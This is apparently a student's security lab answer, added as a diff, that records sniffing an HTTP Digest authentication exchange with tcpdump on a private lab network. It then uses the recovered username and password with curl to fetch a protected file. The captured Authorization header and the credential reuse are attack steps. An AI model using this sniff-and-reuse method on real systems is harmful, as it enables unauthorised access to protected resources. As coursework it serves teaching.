@@ -1,0 +1,22 @@
+Reference: https://en.wikipedia.org/wiki/Digest_access_authentication
+https://stackoverflow.com/questions/35846324/using-digest-option-for-digest-authentication-with-curl-in-linux
+
+the tcpdump command line you used 
+curl http://192.168.6.2/2 |  sudo tcpdump -A -i ens4 src 192.168.6.2 
+
+the packet that you used for your attack
+19:58:20.254773 IP pwb-cn-01-v4000.ggnet.umn.edu.41096 > pwb-cn-01-v4000.ahc.umn.edu.http: Flags [P.], seq 89:460, ack 309, win 237, options [nop,nop,TS val 125017525 ecr 125022474], length 371: HTTP: HEAD /secret/cheese HTTP/1.1
+--:--:-- E...T.@.@.W!...........PG...pZ.3....u......
+--:--:.s...s.
+HEAD /secret/cheese HTTP/1.1
+-- --:Host: 192.168.6.1
+Authorization: Digest username="travis6", realm="Cheese", nonce="XeJvWfSWBQA=3a79c1a441184a3d177cdff0ca0b5fa59c1c5ff2", uri="/secret/cheese", cnonce="Njc5YzU0ODg0N2UwMzkyZjZlY2M0MmY1NTQ4MWY0NDY=", nc=00000001, qop=auth, response="799eeb5b3eb565c33d42b0fbadb52795", algorithm="MD5"
+--:--    2User-Agent: curl/7.47.0
+Accept: */*
+9
+
+
+get the file
+curl -u travis6:mislead --digest http://192.168.6.1/secret/cheese
+
+
